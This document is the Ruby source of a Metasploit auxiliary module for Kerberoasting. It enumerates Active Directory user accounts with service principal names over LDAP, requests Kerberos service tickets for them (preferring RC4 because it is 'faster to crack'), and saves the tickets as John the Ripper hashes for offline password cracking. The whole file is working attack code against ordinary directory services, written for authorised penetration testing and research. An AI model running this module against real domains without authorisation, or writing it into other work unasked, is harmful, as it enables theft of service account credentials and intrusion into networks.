##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::LDAP
  include Msf::Exploit::Remote::LDAP::Queries
  include Msf::OptionalSession::LDAP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)',
        'Description' => %q{
          This module will try to find Service Principal Names that are associated with normal user accounts.
          Since normal accounts' passwords tend to be shorter than machine accounts, and knowing that a TGS request
          will encrypt the ticket with the account the SPN is running under, this could be used for an offline
          bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
          This is part of the kerberoast attack research by Tim Medin (@timmedin).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Solino', # impacket example
          'smashery', # MSF Module
        ],
        'References' => [
          ['URL', 'https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'AKA' => ['GetUserSpns.py', 'get_user_spns']
        }
      )
    )

    register_options(
      [
        Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
        OptString.new('TARGET_USER', [ false, 'Specific user to kerberoast' ]),
        OptBool.new('USE_RC4_HMAC', [ true, 'Request using RC4 hash instead of default encryption types (faster to crack)', true]),
        OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
      ]
    )
    register_option_group(name: 'SESSION',
                          description: 'Used when connecting to LDAP over an existing SESSION',
                          option_names: %w[RHOSTS],
                          required_options: %w[SESSION RHOSTS])
    register_advanced_options(
      [
        OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
      ]
    )
  end

  def run
    if datastore['TARGET_USER'].nil?
      run_ldap
    else
      run_user
    end
  end

  def run_ldap
    results = []
    run_builtin_ldap_query('ENUM_USER_SPNS_KERBEROAST') do |result|
      spn = result.serviceprincipalname[0]
      username = result.samaccountname[0]
      begin
        results.append(roast(username, spn))
      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
        print_error("#{username} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
      end
    end
    stored_path = store_loot('kerberoast.jtr', 'plain/text', rhost, results.join("\n"), 'kerberoast-jtr.txt', "Kerberoasting #{datastore['LDAPDomain']}")
    print_status("Crack file stored at: #{stored_path}")
  end

  def roast(roasted, spn)
    components = spn.split('/')
    fail_with(Failure::UnexpectedReply, "Invalid SPN: #{spn}") unless components.length == 2

    sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
      name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
      name_string: components
    )
    domain_name = datastore['LDAPDomain']
    rhostname = datastore['DomainControllerRhost']
    username = datastore['LDAPUsername']
    password = datastore['LDAPPassword']
    authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(
      host: rhostname,
      realm: domain_name,
      username: username,
      password: password,
      offered_etypes: offered_etypes,
      framework: framework,
      framework_module: framework_module,
      ticket_storage: Msf::Exploit::Remote::Kerberos::Ticket::Storage::WriteOnly.new(framework: framework, framework_module: framework_module)
    )

    # Get a TGT - allow getting from cache
    options = {
      cache_file: datastore['LDAP::Krb5Ccname'],
      ticket_storage: Msf::Exploit::Remote::Kerberos::Ticket::Storage::ReadWrite.new(framework: framework, framework_module: framework_module)
    }
    credential = authenticator.request_tgt_only(options)

    now = Time.now.utc
    expiry_time = now + 1.day

    ticket = Rex::Proto::Kerberos::Model::Ticket.decode(credential.ticket.value)
    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
      type: credential.keyblock.enctype.value,
      value: credential.keyblock.data.value
    )

    etypes = Set.new([credential.keyblock.enctype.value])
    tgs_options = {
      pa_data: []
    }

    tgs_ticket, = authenticator.request_service_ticket(
      session_key,
      ticket,
      domain_name.upcase,
      username,
      etypes,
      expiry_time,
      now,
      sname,
      tgs_options
    )
    format_tgs_rep_to_john_hash(tgs_ticket, roasted)
  end

  def offered_etypes
    if datastore['USE_RC4_HMAC']
      [Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC]
    else
      Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['LDAP::KrbOfferedEncryptionTypes'])
    end
  end

  attr_accessor :ldap_query # The LDAP query for this module, loaded from a yaml file

end
